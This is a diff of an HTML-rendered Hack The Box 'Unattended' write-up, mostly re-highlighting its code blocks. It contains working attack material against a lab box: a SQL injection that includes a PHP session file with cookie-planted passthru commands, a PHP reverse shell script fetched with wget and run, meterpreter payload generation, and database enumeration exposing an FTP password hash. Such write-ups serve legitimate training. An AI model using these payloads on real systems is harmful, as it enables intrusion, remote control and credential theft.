+<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=c5vmccsqkle2rdionj28kit221; RCE=&lt;?php passthru('whoami')?&gt;;</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">max-age=0</span>
 </code></pre></div></div>
 <p><br> Response :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
-Server: nginx/1.10.3
-Date: Fri, 23 Aug 2019 16:25:45 GMT
-Content-Type: text/html; charset=UTF-8
-Content-Length: 955
-Connection: close
-Expires: Thu, 19 Nov 1981 08:52:00 GMT
-Cache-Control: no-store, no-cache, must-revalidate
-Pragma: no-cache
-Vary: Accept-Encoding
-X-Upstream: 127.0.0.1:8080
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">nginx/1.10.3</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Fri, 23 Aug 2019 16:25:45 GMT</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">955</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Expires</span><span class="p">:</span> <span class="s">Thu, 19 Nov 1981 08:52:00 GMT</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-store, no-cache, must-revalidate</span>
+<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
+<span class="na">Vary</span><span class="p">:</span> <span class="s">Accept-Encoding</span>
+<span class="na">X-Upstream</span><span class="p">:</span> <span class="s">127.0.0.1:8080</span>
 
-&lt;!DOCTYPE html&gt;
+<span class="cp">&lt;!DOCTYPE html&gt;</span>
 ----------------
  Removed Output
 ----------------
-&lt;!-- &lt;div align="center"&gt; --&gt;
+<span class="c">&lt;!-- &lt;div align="center"&gt; --&gt;</span>
 PHPSESSID|s:26:"c5vmccsqkle2rdionj28kit221";RCE|s:26:"www-data
-";&lt;!-- &lt;/div&gt; --&gt;
+";<span class="c">&lt;!-- &lt;/div&gt; --&gt;</span>
 
-&lt;/div&gt; &lt;!-- row --&gt;
-&lt;/div&gt; &lt;!-- container --&gt;
+<span class="nt">&lt;/div&gt;</span> <span class="c">&lt;!-- row --&gt;</span>
+<span class="nt">&lt;/div&gt;</span> <span class="c">&lt;!-- container --&gt;</span>
 
-&lt;/body&gt;
-&lt;/html&gt;
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
 </code></pre></div></div>
 <p><br> I spent a lot of time trying to get a reverse shell and I couldn’t, so I checked <code class="highlighter-rouge">iptables</code> rules :
 <br> Request :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /index.php?id=25%27+UNION+SELECT+%22main%27+UNION+SELECT+%27/var/lib/php/sessions/sess_c5vmccsqkle2rdionj28kit221%27%3b--+%22%3b--+ HTTP/1.1
-Host: www.nestedflanders.htb
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Cookie: PHPSESSID=c5vmccsqkle2rdionj28kit221; RCE=&lt;?php passthru('cat /etc/iptables/rules.v4')?&gt;;
-Connection: close
-Upgrade-Insecure-Requests: 1
-Cache-Control: max-age=0
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/index.php?id=25%27+UNION+SELECT+%22main%27+UNION+SELECT+%27/var/lib/php/sessions/sess_c5vmccsqkle2rdionj28kit221%27%3b--+%22%3b--+</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">www.nestedflanders.htb</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=c5vmccsqkle2rdionj28kit221; RCE=&lt;?php passthru('cat /etc/iptables/rules.v4')?&gt;;</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">max-age=0</span>
 </code></pre></div></div>
 <p><br> Response :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
-Server: nginx/1.10.3
-Date: Fri, 23 Aug 2019 16:27:11 GMT
-Content-Type: text/html; charset=UTF-8
-Content-Length: 1592
-Connection: close
-Expires: Thu, 19 Nov 1981 08:52:00 GMT
-Cache-Control: no-store, no-cache, must-revalidate
-Pragma: no-cache
-Vary: Accept-Encoding
-X-Upstream: 127.0.0.1:8080
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">nginx/1.10.3</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Fri, 23 Aug 2019 16:27:11 GMT</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">1592</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Expires</span><span class="p">:</span> <span class="s">Thu, 19 Nov 1981 08:52:00 GMT</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-store, no-cache, must-revalidate</span>
+<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
+<span class="na">Vary</span><span class="p">:</span> <span class="s">Accept-Encoding</span>
+<span class="na">X-Upstream</span><span class="p">:</span> <span class="s">127.0.0.1:8080</span>
 
-&lt;!DOCTYPE html&gt;
+<span class="cp">&lt;!DOCTYPE html&gt;</span>
 ----------------
  Removed Output
 ----------------
-&lt;!-- &lt;div align="center"&gt; --&gt;
+<span class="c">&lt;!-- &lt;div align="center"&gt; --&gt;</span>
 PHPSESSID|s:26:"c5vmccsqkle2rdionj28kit221";RCE|s:46:"# Generated by iptables-save v1.6.0 on Wed Dec 19 21:55:49 2018
 *filter
 :INPUT DROP [7:1813]
@@ -953,46 +947,46 @@ PHPSESSID|s:26:"c5vmccsqkle2rdionj28kit221";RCE|s:46:"# Generated by iptables-sa
 -A OUTPUT -o ens33 -p icmp -j ACCEPT
 COMMIT
 # Completed on Wed Dec 19 21:55:49 2018
-";&lt;!-- &lt;/div&gt; --&gt;
+";<span class="c">&lt;!-- &lt;/div&gt; --&gt;</span>
 
-&lt;/div&gt; &lt;!-- row --&gt;
-&lt;/div&gt; &lt;!-- container --&gt;
+<span class="nt">&lt;/div&gt;</span> <span class="c">&lt;!-- row --&gt;</span>
+<span class="nt">&lt;/div&gt;</span> <span class="c">&lt;!-- container --&gt;</span>
 
-&lt;/body&gt;
-&lt;/html&gt;
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
 </code></pre></div></div>
 <p><br> We can only get a reverse shell on ports 443 and 80. My problem was trying to get a connection on port 1337. 
 <br> <code class="highlighter-rouge">nc</code> wasn’t on the box so I used <code class="highlighter-rouge">php</code> to get a reverse shell.
 <br> <code class="highlighter-rouge">shell.sh</code> :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
 php <span class="nt">-r</span> <span class="s1">'$sock=fsockopen("10.10.xx.xx",443);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span>
 </code></pre></div></div>
 <p><br> I started a python server on port 80 then I downloaded the shell file on the box and executed it :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /index.php?id=25%27+UNION+SELECT+%22main%27+UNION+SELECT+%27/var/lib/php/sessions/sess_c5vmccsqkle2rdionj28kit221%27%3b--+%22%3b--+ HTTP/1.1
-Host: www.nestedflanders.htb
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Cookie: PHPSESSID=c5vmccsqkle2rdionj28kit221; RCE=&lt;?php passthru('cd /tmp &amp;&amp; wget http://10.10.xx.xx/shell.sh')?&gt;;
-Connection: close
-Upgrade-Insecure-Requests: 1
-Cache-Control: max-age=0
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/index.php?id=25%27+UNION+SELECT+%22main%27+UNION+SELECT+%27/var/lib/php/sessions/sess_c5vmccsqkle2rdionj28kit221%27%3b--+%22%3b--+</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">www.nestedflanders.htb</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=c5vmccsqkle2rdionj28kit221; RCE=&lt;?php passthru('cd /tmp &amp;&amp; wget http://10.10.xx.xx/shell.sh')?&gt;;</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">max-age=0</span>
 </code></pre></div></div>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /index.php?id=25%27+UNION+SELECT+%22main%27+UNION+SELECT+%27/var/lib/php/sessions/sess_c5vmccsqkle2rdionj28kit221%27%3b--+%22%3b--+ HTTP/1.1
-Host: www.nestedflanders.htb
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Cookie: PHPSESSID=c5vmccsqkle2rdionj28kit221; RCE=&lt;?php passthru('cd /tmp &amp;&amp; sh shell.sh')?&gt;;
-Connection: close
-Upgrade-Insecure-Requests: 1
-Cache-Control: max-age=0
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/index.php?id=25%27+UNION+SELECT+%22main%27+UNION+SELECT+%27/var/lib/php/sessions/sess_c5vmccsqkle2rdionj28kit221%27%3b--+%22%3b--+</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">www.nestedflanders.htb</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=c5vmccsqkle2rdionj28kit221; RCE=&lt;?php passthru('cd /tmp &amp;&amp; sh shell.sh')?&gt;;</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">max-age=0</span>
 </code></pre></div></div>
 <p><br> And we get a shell as <code class="highlighter-rouge">www-data</code> :
-<img src="/images/hackthebox/unattended/16.png" alt="">
+<br><img src="/images/hackthebox/unattended/16.png" alt=""><br>
 <br> But I didn’t like 2 things about this shell. First thing, it wasn’t a tty shell. Second thing, with only 2 ports available It was annoying because I usually need more shells. So I created a <code class="highlighter-rouge">php</code> <code class="highlighter-rouge">meterpreter</code> payload because with <code class="highlighter-rouge">meterpreter</code> I can spawn as many shells as I want and they can be tty shells.</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/unattended# msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.xx.xx LPORT=80 &gt; shell.php                                                                                          
 [-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
@@ -1031,7 +1025,7 @@ msf5 exploit(multi/handler) &gt; run
 
 meterpreter &gt;
 </code></pre></div></div>
-<p><img src="/images/hackthebox/unattended/17.png" alt="">
+<p><br><img src="/images/hackthebox/unattended/17.png" alt=""><br>
 <br> Note : I stopped the python server before starting the listener because both of them use port 80.
 <br></p>
 <hr>
@@ -1065,119 +1059,119 @@ Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
 MariaDB [(none)]&gt; 
 </code></pre></div></div>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MariaDB [(none)]&gt; use neddy;
-use neddy;
-Reading table information for completion of table and column names
-You can turn off this feature to get a quicker startup with -A
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">MariaDB</span> <span class="p">[(</span><span class="k">none</span><span class="p">)]</span><span class="o">&gt;</span> <span class="n">use</span> <span class="n">neddy</span><span class="p">;</span>
+<span class="n">use</span> <span class="n">neddy</span><span class="p">;</span>
+<span class="n">Reading</span> <span class="k">table</span> <span class="n">information</span> <span class="k">for</span> <span class="k">completion</span> <span class="k">of</span> <span class="k">table</span> <span class="k">and</span> <span class="k">column</span> <span class="k">names</span>
+<span class="n">You</span> <span class="n">can</span> <span class="n">turn</span> <span class="k">off</span> <span class="n">this</span> <span class="n">feature</span> <span class="k">to</span> <span class="k">get</span> <span class="n">a</span> <span class="n">quicker</span> <span class="n">startup</span> <span class="k">with</span> <span class="o">-</span><span class="n">A</span>
 
-Database changed
-MariaDB [neddy]&gt; show tables;
-show tables;
-+-----------------+
-| Tables_in_neddy |
-+-----------------+
-| config          |
-| customers       |
-| employees       |
-| filepath        |
-| idname          |
-| offices         |
-| orderdetails    |
-| orders          |
-| payments        |
-| productlines    |
-| products        |
-+-----------------+
-11 rows in set (0.00 sec)
+<span class="k">Database</span> <span class="n">changed</span>
+<span class="n">MariaDB</span> <span class="p">[</span><span class="n">neddy</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">show</span> <span class="n">tables</span><span class="p">;</span>
+<span class="k">show</span> <span class="n">tables</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">-----------------+</span>
+<span class="o">|</span> <span class="n">Tables_in_neddy</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">-----------------+</span>
+<span class="o">|</span> <span class="n">config</span>          <span class="o">|</span>
+<span class="o">|</span> <span class="n">customers</span>       <span class="o">|</span>
+<span class="o">|</span> <span class="n">employees</span>       <span class="o">|</span>
+<span class="o">|</span> <span class="n">filepath</span>        <span class="o">|</span>
+<span class="o">|</span> <span class="n">idname</span>          <span class="o">|</span>
+<span class="o">|</span> <span class="n">offices</span>         <span class="o">|</span>
+<span class="o">|</span> <span class="n">orderdetails</span>    <span class="o">|</span>
+<span class="o">|</span> <span class="n">orders</span>          <span class="o">|</span>
+<span class="o">|</span> <span class="n">payments</span>        <span class="o">|</span>
+<span class="o">|</span> <span class="n">productlines</span>    <span class="o">|</span>
+<span class="o">|</span> <span class="n">products</span>        <span class="o">|</span>
+<span class="o">+</span><span class="c1">-----------------+</span>
+<span class="mi">11</span> <span class="k">rows</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
 
-MariaDB [neddy]&gt; 
+<span class="n">MariaDB</span> <span class="p">[</span><span class="n">neddy</span><span class="p">]</span><span class="o">&gt;</span> 
 </code></pre></div></div>
 <p><br> <code class="highlighter-rouge">config</code> looks interesting, let’s check it :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MariaDB [neddy]&gt; select * from config;                                                                                                                                                                             
-select * from config;
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">MariaDB</span> <span class="p">[</span><span class="n">neddy</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">config</span><span class="p">;</span>                                                                                                                                                                             
+<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">config</span><span class="p">;</span>
 
-+-----+-------------------------+--------------------------------------------------------------------------+         
-| id  | option_name             | option_value                                                             |           
-+-----+-------------------------+--------------------------------------------------------------------------+          
-|  54 | offline                 | 0                                                                        |          
-|  55 | offline_message         | Site offline, please come back later                                     |           
-|  56 | display_offline_message | 0                                                                        |          
-|  57 | offline_image           |                                                                          |         
-|  58 | sitename                | NestedFlanders                                                           |          
-|  59 | editor                  | tinymce                                                                  |         
-|  60 | captcha                 | 0                                                                        |         
-|  61 | list_limit              | 20                                                                       |          
-|  62 | access                  | 1                                                                        |         
-|  63 | debug                   | 0                                                                        |         
-|  64 | debug_lang              | 0                                                                        |          
-|  65 | dbtype                  | mysqli                                                                   |         
-|  66 | host                    | localhost                                                                |          
-|  67 | live_site               |                                                                          |          
-|  68 | gzip                    | 0                                                                        |         
-|  69 | error_reporting         | default                                                                  |         
-|  70 | ftp_host                | 127.0.0.1                                                                |          
-|  71 | ftp_port                | 21                                                                       |          
-|  72 | ftp_user                | flanders                                                                 |
-|  73 | ftp_pass                | 0e1aff658d8614fd0eac6705bb69fb684f6790299e4cf01e1b90b1a287a94ffcde451466 |       
-|  74 | ftp_root                | /                                                                        |         
-|  75 | ftp_enable              | 1                                                                        |         
-|  76 | offset                  | UTC                                                                      |         
-|  77 | mailonline              | 1                                                                        |          
-|  78 | mailer                  | mail                                                                     |          
-|  79 | mailfrom                | nested@nestedflanders.htb                                                |         
-|  80 | fromname                | Neddy                                                                    |         
-|  81 | sendmail                | /usr/sbin/sendmail                                                       |          
-|  82 | smtpauth                | 0                                                                        |         
-|  83 | smtpuser                |                                                                          |         
-|  84 | smtppass                |                                                                          |         
-|  85 | smtppass                |                                                                          |         
-|  86 | checkrelease            | /home/guly/checkbase.pl;/home/guly/checkplugins.pl;                      |          
-|  87 | smtphost                | localhost                                                                |
-|  88 | smtpsecure              | none                                                                     |
-|  89 | smtpport                | 25                                                                       |
-|  90 | caching                 | 0                                                                        |
-|  91 | cache_handler           | file                                                                     |
-|  92 | cachetime               | 15                                                                       |
-|  93 | MetaDesc                |                                                                          |
-|  94 | MetaKeys                |                                                                          |
-|  95 | MetaTitle               | 1                                                                        |
-|  96 | MetaAuthor              | 1                                                                        |
-|  97 | MetaVersion             | 0                                                                        |
-|  98 | robots                  |                                                                          |
-|  99 | sef                     | 1                                                                        |
-| 100 | sef_rewrite             | 0                                                                        |
-| 101 | sef_suffix              | 0                                                                        |
-| 102 | unicodeslugs            | 0                                                                        |          
-| 103 | feed_limit              | 10                                                                       |         
-| 104 | lifetime                | 1                                                                        |          
-| 105 | session_handler         | file                                                                     |         
-+-----+-------------------------+--------------------------------------------------------------------------+                                                                                                      
-52 rows in set (0.00 sec)
+<span class="o">+</span><span class="c1">-----+-------------------------+--------------------------------------------------------------------------+         </span>
+<span class="o">|</span> <span class="n">id</span>  <span class="o">|</span> <span class="n">option_name</span>             <span class="o">|</span> <span class="n">option_value</span>                                                             <span class="o">|</span>           
+<span class="o">+</span><span class="c1">-----+-------------------------+--------------------------------------------------------------------------+          </span>
+<span class="o">|</span>  <span class="mi">54</span> <span class="o">|</span> <span class="n">offline</span>                 <span class="o">|</span> <span class="mi">0</span>                                                                        <span class="o">|</span>          
+<span class="o">|</span>  <span class="mi">55</span> <span class="o">|</span> <span class="n">offline_message</span>         <span class="o">|</span> <span class="n">Site</span> <span class="n">offline</span><span class="p">,</span> <span class="n">please</span> <span class="n">come</span> <span class="n">back</span> <span class="n">later</span>                                     <span class="o">|</span>           
+<span class="o">|</span>  <span class="mi">56</span> <span class="o">|</span> <span class="n">display_offline_message</span> <span class="o">|</span> <span class="mi">0</span>                                                                        <span class="o">|</span>          
+<span class="o">|</span>  <span class="mi">57</span> <span class="o">|</span> <span class="n">offline_image</span>           <span class="o">|</span>                                                                          <span class="o">|</span>         
+<span class="o">|</span>  <span class="mi">58</span> <span class="o">|</span> <span class="n">sitename</span>                <span class="o">|</span> <span class="n">NestedFlanders</span>                                                           <span class="o">|</span>          
+<span class="o">|</span>  <span class="mi">59</span> <span class="o">|</span> <span class="n">editor</span>                  <span class="o">|</span> <span class="n">tinymce</span>                                                                  <span class="o">|</span>         
+<span class="o">|</span>  <span class="mi">60</span> <span class="o">|</span> <span class="n">captcha</span>                 <span class="o">|</span> <span class="mi">0</span>                                                                        <span class="o">|</span>         
+<span class="o">|</span>  <span class="mi">61</span> <span class="o">|</span> <span class="n">list_limit</span>              <span class="o">|</span> <span class="mi">20</span>                                                                       <span class="o">|</span>          
+<span class="o">|</span>  <span class="mi">62</span> <span class="o">|</span> <span class="k">access</span>                  <span class="o">|</span> <span class="mi">1</span>                                                                        <span class="o">|</span>         
+<span class="o">|</span>  <span class="mi">63</span> <span class="o">|</span> <span class="n">debug</span>                   <span class="o">|</span> <span class="mi">0</span>                                                                        <span class="o">|</span>         
+<span class="o">|</span>  <span class="mi">64</span> <span class="o">|</span> <span class="n">debug_lang</span>              <span class="o">|</span> <span class="mi">0</span>                                                                        <span class="o">|</span>          
+<span class="o">|</span>  <span class="mi">65</span> <span class="o">|</span> <span class="n">dbtype</span>                  <span class="o">|</span> <span class="n">mysqli</span>                                                                   <span class="o">|</span>         
+<span class="o">|</span>  <span class="mi">66</span> <span class="o">|</span> <span class="k">host</span>                    <span class="o">|</span> <span class="n">localhost</span>                                                                <span class="o">|</span>          
+<span class="o">|</span>  <span class="mi">67</span> <span class="o">|</span> <span class="n">live_site</span>               <span class="o">|</span>                                                                          <span class="o">|</span>          
+<span class="o">|</span>  <span class="mi">68</span> <span class="o">|</span> <span class="n">gzip</span>                    <span class="o">|</span> <span class="mi">0</span>                                                                        <span class="o">|</span>         
+<span class="o">|</span>  <span class="mi">69</span> <span class="o">|</span> <span class="n">error_reporting</span>         <span class="o">|</span> <span class="k">default</span>                                                                  <span class="o">|</span>         
+<span class="o">|</span>  <span class="mi">70</span> <span class="o">|</span> <span class="n">ftp_host</span>                <span class="o">|</span> <span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span>                                                                <span class="o">|</span>          
+<span class="o">|</span>  <span class="mi">71</span> <span class="o">|</span> <span class="n">ftp_port</span>                <span class="o">|</span> <span class="mi">21</span>                                                                       <span class="o">|</span>          
+<span class="o">|</span>  <span class="mi">72</span> <span class="o">|</span> <span class="n">ftp_user</span>                <span class="o">|</span> <span class="n">flanders</span>                                                                 <span class="o">|</span>
+<span class="o">|</span>  <span class="mi">73</span> <span class="o">|</span> <span class="n">ftp_pass</span>                <span class="o">|</span> <span class="mi">0</span><span class="n">e1aff658d8614fd0eac6705bb69fb684f6790299e4cf01e1b90b1a287a94ffcde451466</span> <span class="o">|</span>       
+<span class="o">|</span>  <span class="mi">74</span> <span class="o">|</span> <span class="n">ftp_root</span>                <span class="o">|</span> <span class="o">/</span>                                                                        <span class="o">|</span>         
+<span class="o">|</span>  <span class="mi">75</span> <span class="o">|</span> <span class="n">ftp_enable</span>              <span class="o">|</span> <span class="mi">1</span>                                                                        <span class="o">|</span>         
+<span class="o">|</span>  <span class="mi">76</span> <span class="o">|</span> <span class="k">offset</span>                  <span class="o">|</span> <span class="n">UTC</span>                                                                      <span class="o">|</span>         
+<span class="o">|</span>  <span class="mi">77</span> <span class="o">|</span> <span class="n">mailonline</span>              <span class="o">|</span> <span class="mi">1</span>                                                                        <span class="o">|</span>          
+<span class="o">|</span>  <span class="mi">78</span> <span class="o">|</span> <span class="n">mailer</span>                  <span class="o">|</span> <span class="n">mail</span>                                                                     <span class="o">|</span>          
+<span class="o">|</span>  <span class="mi">79</span> <span class="o">|</span> <span class="n">mailfrom</span>                <span class="o">|</span> <span class="n">nested</span><span class="o">@</span><span class="n">nestedflanders</span><span class="p">.</span><span class="n">htb</span>                                                <span class="o">|</span>         
+<span class="o">|</span>  <span class="mi">80</span> <span class="o">|</span> <span class="n">fromname</span>                <span class="o">|</span> <span class="n">Neddy</span>                                                                    <span class="o">|</span>         
+<span class="o">|</span>  <span class="mi">81</span> <span class="o">|</span> <span class="n">sendmail</span>                <span class="o">|</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">sendmail</span>                                                       <span class="o">|</span>          
+<span class="o">|</span>  <span class="mi">82</span> <span class="o">|</span> <span class="n">smtpauth</span>                <span class="o">|</span> <span class="mi">0</span>                                                                        <span class="o">|</span>         
+<span class="o">|</span>  <span class="mi">83</span> <span class="o">|</span> <span class="n">smtpuser</span>                <span class="o">|</span>                                                                          <span class="o">|</span>         
+<span class="o">|</span>  <span class="mi">84</span> <span class="o">|</span> <span class="n">smtppass</span>                <span class="o">|</span>                                                                          <span class="o">|</span>         
+<span class="o">|</span>  <span class="mi">85</span> <span class="o">|</span> <span class="n">smtppass</span>                <span class="o">|</span>                                                                          <span class="o">|</span>         
+<span class="o">|</span>  <span class="mi">86</span> <span class="o">|</span> <span class="n">checkrelease</span>            <span class="o">|</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">guly</span><span class="o">/</span><span class="n">checkbase</span><span class="p">.</span><span class="n">pl</span><span class="p">;</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">guly</span><span class="o">/</span><span class="n">checkplugins</span><span class="p">.</span><span class="n">pl</span><span class="p">;</span>                      <span class="o">|</span>          
+<span class="o">|</span>  <span class="mi">87</span> <span class="o">|</span> <span class="n">smtphost</span>                <span class="o">|</span> <span class="n">localhost</span>                                                                <span class="o">|</span>
+<span class="o">|</span>  <span class="mi">88</span> <span class="o">|</span> <span class="n">smtpsecure</span>              <span class="o">|</span> <span class="k">none</span>                                                                     <span class="o">|</span>
+<span class="o">|</span>  <span class="mi">89</span> <span class="o">|</span> <span class="n">smtpport</span>                <span class="o">|</span> <span class="mi">25</span>                                                                       <span class="o">|</span>
+<span class="o">|</span>  <span class="mi">90</span> <span class="o">|</span> <span class="n">caching</span>                 <span class="o">|</span> <span class="mi">0</span>                                                                        <span class="o">|</span>
+<span class="o">|</span>  <span class="mi">91</span> <span class="o">|</span> <span class="n">cache_handler</span>           <span class="o">|</span> <span class="n">file</span>                                                                     <span class="o">|</span>
+<span class="o">|</span>  <span class="mi">92</span> <span class="o">|</span> <span class="n">cachetime</span>               <span class="o">|</span> <span class="mi">15</span>                                                                       <span class="o">|</span>
+<span class="o">|</span>  <span class="mi">93</span> <span class="o">|</span> <span class="n">MetaDesc</span>                <span class="o">|</span>                                                                          <span class="o">|</span>
+<span class="o">|</span>  <span class="mi">94</span> <span class="o">|</span> <span class="n">MetaKeys</span>                <span class="o">|</span>                                                                          <span class="o">|</span>
+<span class="o">|</span>  <span class="mi">95</span> <span class="o">|</span> <span class="n">MetaTitle</span>               <span class="o">|</span> <span class="mi">1</span>                                                                        <span class="o">|</span>
+<span class="o">|</span>  <span class="mi">96</span> <span class="o">|</span> <span class="n">MetaAuthor</span>              <span class="o">|</span> <span class="mi">1</span>                                                                        <span class="o">|</span>
+<span class="o">|</span>  <span class="mi">97</span> <span class="o">|</span> <span class="n">MetaVersion</span>             <span class="o">|</span> <span class="mi">0</span>                                                                        <span class="o">|</span>
+<span class="o">|</span>  <span class="mi">98</span> <span class="o">|</span> <span class="n">robots</span>                  <span class="o">|</span>                                                                          <span class="o">|</span>
+<span class="o">|</span>  <span class="mi">99</span> <span class="o">|</span> <span class="n">sef</span>                     <span class="o">|</span> <span class="mi">1</span>                                                                        <span class="o">|</span>
+<span class="o">|</span> <span class="mi">100</span> <span class="o">|</span> <span class="n">sef_rewrite</span>             <span class="o">|</span> <span class="mi">0</span>                                                                        <span class="o">|</span>
+<span class="o">|</span> <span class="mi">101</span> <span class="o">|</span> <span class="n">sef_suffix</span>              <span class="o">|</span> <span class="mi">0</span>                                                                        <span class="o">|</span>
